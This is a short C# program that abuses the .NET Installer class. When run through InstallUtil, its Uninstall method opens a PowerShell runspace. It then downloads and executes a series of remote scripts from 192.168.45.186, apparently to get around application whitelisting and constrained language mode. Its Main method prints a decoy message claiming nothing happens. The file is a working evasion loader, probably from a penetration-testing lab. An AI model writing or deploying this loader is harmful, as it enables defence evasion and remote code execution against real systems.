using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Nothing going on in this binary.");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "iex((iwr -usebasicparsing -uri http://192.168.45.186/bypass/1.txt).Content); Start-Sleep 2; echo 1; iex((iwr -usebasicparsing -uri http://192.168.45.186/bypass/2.txt).Content); Start-Sleep 2; echo 2; iex((iwr -usebasicparsing -uri http://192.168.45.186/bypass/3.txt).Content); Start-Sleep 5; echo 3; iex((iwr -usebasicparsing -uri http://192.168.45.186/bypass/4.txt).Content); Start-Sleep 5; echo 4; iex((iwr -usebasicparsing -uri http://192.168.45.186/run.txt).Content); echo Done;";
            // To first test if it works:
			// String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Users\\Public\\test.txt"
			Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}